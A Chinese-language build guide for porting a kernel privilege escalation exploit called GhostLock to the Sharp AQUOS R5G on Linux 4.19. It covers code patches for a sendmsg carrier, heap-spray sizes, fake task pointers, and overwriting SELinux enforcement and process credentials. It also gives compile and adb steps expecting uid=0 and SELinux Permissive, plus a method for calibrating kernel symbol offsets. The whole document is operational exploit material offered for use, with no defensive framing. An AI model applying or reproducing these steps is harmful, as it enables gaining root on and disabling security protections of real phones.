# GhostLock R5G 构建说明（基于 4.19 适配版）

上游基线：`XiaoBaiLovesStirring/ghostlock-k419-adapter`（OnePlus 4.19.152 的
GhostLock 适配）。它自带完整 exploit 流程，但载体是 pselect；R5G 必须换成
sendmsg。下面的改动都是围绕这一点。

## 1. 取上游

```bash
git clone --depth 1 https://github.com/XiaoBaiLovesStirring/ghostlock-k419-adapter.git ghostlock-r5g
cd ghostlock-r5g
```

## 2. 放入 R5G target

把本目录的 `src/devices/aquos_r5g/` 整个复制到上游的 `src/devices/aquos_r5g/`。

在 `src/devices/offsets.h` 的 `known_offsets[]` 里加一行（放在
`{ .uname_r = NULL }` 之前）：

```c
#include "aquos_r5g/offsets.h"
```

## 3. 加入 sendmsg 载体

把 `patch/sendmsg_carrier.c` 复制到 `src/core/sendmsg_carrier.c`。

`Makefile` 的 `SRCS` 增加一行：

```make
  src/core/sendmsg_carrier.c \
```

`CFLAGS` 增加：

```make
  -DUSE_SENDMSG_CARRIER=1
```

## 4. 修改 src/core/fops.c

### 4.1 先修 4.19 常量（src/core/common.h）

k419 适配的 `common.h` 默认是 6.x 的常量，R5G 必须改：

```c
/* 4.19 mm_struct logical size */
#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x500
#endif
```

改成：

```c
#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x380
#endif
```

并把：

```c
#define SKB_DATA_DELTA (-0xe80LL)
```

改成：

```c
#ifndef SKB_DATA_DELTA
#define SKB_DATA_DELTA 0
#endif
```

`SKB_DATA_DELTA` 在 4.19 的固定线性映射下是 0（K40 4.19 适配也是 0）。
`MM_STRUCT_SZ=0x380` 是逻辑大小；SLUB 实际对象步长是
`ALIGN(0x380 + cpumask_size(), 64) = 0x3c0`。如果 spray 计数不对，
把 `util.c` 里的 `ORDER3_SIZE / MM_STRUCT_SZ` 改成 `ORDER3_SIZE / 0x3c0`，
但 `kernelsnitch_setup()` 仍用 0x380。

在文件顶部（`extern int pselect_custom_write;` 附近）加声明：

```c
int sendmsg_carrier_once(int seq, int *out_errno);
```

### 4.2 不走 KASLR 的直接路径

k419 的 `main.c` 已经有一条**不需要 slide** 的路径：

```c
kaslr_slide = 0;
kaslr_base = KIMAGE_TEXT_BASE;
kaslr_done = 1;
...
do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
...
do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2);
```

只要第一次写和 cred 写都走 `data_addr()`（线性映射别名），就不需要 KASLR。
但 `src/core/util.c` 的 `prepare_skb_payload()` 里还有三处用 `text_addr()`
写 fake task 的字段：

```c
uint64_t waiter_task = text_addr(INIT_TASK);
uint64_t task_group = text_addr(ROOT_TASK_GROUP);
uint64_t pi_top_task = text_addr(INIT_TASK);
```

没有 slide 时 `text_addr()` 返回未随机化的地址，PI 链会读到错误指针。
在 R5G 上改成线性映射别名：

```c
uint64_t waiter_task = data_addr(INIT_TASK);
uint64_t task_group = data_addr(ROOT_TASK_GROUP);
uint64_t pi_top_task = data_addr(INIT_TASK);
```

`put_fake_fops_table()` 里的 `text_addr(ASHMEM_*)` 只服务于 fops/UMH 路径；
R5G 的 `CONFIG_STATIC_USERMODEHELPER=y`，把 target 里的
`off_system_unbound_wq` 置 0 后不会走这条路径，可以忽略。

另外，`write_root_script()` 里有一行会让 SELinux 重新 enforcing：

```c
"echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
```

这次目标是关闭 SELinux，改成 `echo 0`（或删掉这一行）。

在 `do_pselect_fake_lock_route()` 里找到：

```c
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);
```

改为：

```c
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
#ifdef USE_SENDMSG_CARRIER
    /* The carrier arms punch_consume_go immediately before sendmsg(). */
    atomic_store(&punch_consume_go, 0);
#else
    atomic_store(&punch_consume_go, route_attempt);
#endif
```

再找到：

```c
    errno = 0;
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    int saved_errno = errno;
```

改成：

```c
    errno = 0;
#ifdef USE_SENDMSG_CARRIER
    int saved_errno = 0;
    int ret = sendmsg_carrier_once(route_attempt, &saved_errno);
#else
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    int saved_errno = errno;
#endif
```

保留后面的 `pr_info("pselect post-select...")`、`route_signal` 和
`try_cfi_stage()` 逻辑不变。sendmsg 的返回值不是 `PSELECT_EXPECTED_READY`，
只会多一条 "probing cfi" 日志，不影响 `calls/success` 判定。

## 5. 编译（Windows NDK）

```bash
NDK=C:/Users/<you>/AppData/Local/Android/Sdk/ndk/27.2.12479018
CC=$NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android31-clang
$CC -O2 -fPIE -pie -pthread \
  -Isrc/core -Isrc/devices \
  -DTARGET_CONFIG_H='"aquos_r5g/target.h"' \
  -DUSE_SENDMSG_CARRIER=1 \
  src/core/main.c src/core/util.c src/core/slide.c src/core/fops.c \
  src/core/pipe_physrw.c src/core/root.c src/core/miniadb.c \
  src/core/umh_root.c src/core/sendmsg_carrier.c \
  -o ghostlock
```

（上游 Makefile 用的是 aarch64-linux-gnu-gcc；换 NDK clang 时把 `-static`
去掉，Android 上动态链接 bionic 即可。）

## 6. 运行

```bash
adb push ghostlock /data/local/tmp/ghostlock
adb shell chmod 755 /data/local/tmp/ghostlock
adb shell /data/local/tmp/ghostlock
```

期望日志： `id` 为 `uid=0`，
`getenforce` 为 `Permissive`。

## 7. 必须先校准

`src/devices/aquos_r5g/offsets.h` 里的符号偏移来自本仓库的分析构建
（clang 11.0.5、`MODVERSIONS=n`）。量产内核的 `.text` 大小可能不同，
所有 `.text` 之后的数据符号要整体加 `DELTA`：

```
DELTA = (量产 _etext_off) - 0x1380000
```

量产 `_etext_off` 用手机上的 `/proc/iomem` 算：

```
adb shell cat /proc/iomem | grep -i "kernel code"
# 例如 80080000-81900000 : Kernel code
# _etext_off = 0x81900000 - 0x80080000 = 0x1880000
# DELTA = 0x1880000 - 0x1380000 = 0x500000
```

把 `offsets.h` 里 `off_init_task`、`off_selinux_enforcing`、`off_init_cred` 等
**数据符号**都加上 DELTA。函数符号（`off_ashmem_*`、`off_configfs_*`）不能靠
DELTA 修正；如果 `/proc/kallsyms` 地址可读，优先用运行时地址替换。

`kernel_phys_load` 通常是 `0x80080000`；如果 `/proc/iomem` 的 Kernel code
起点不是 `0x80080800`，按 `start - 0x800` 修正。
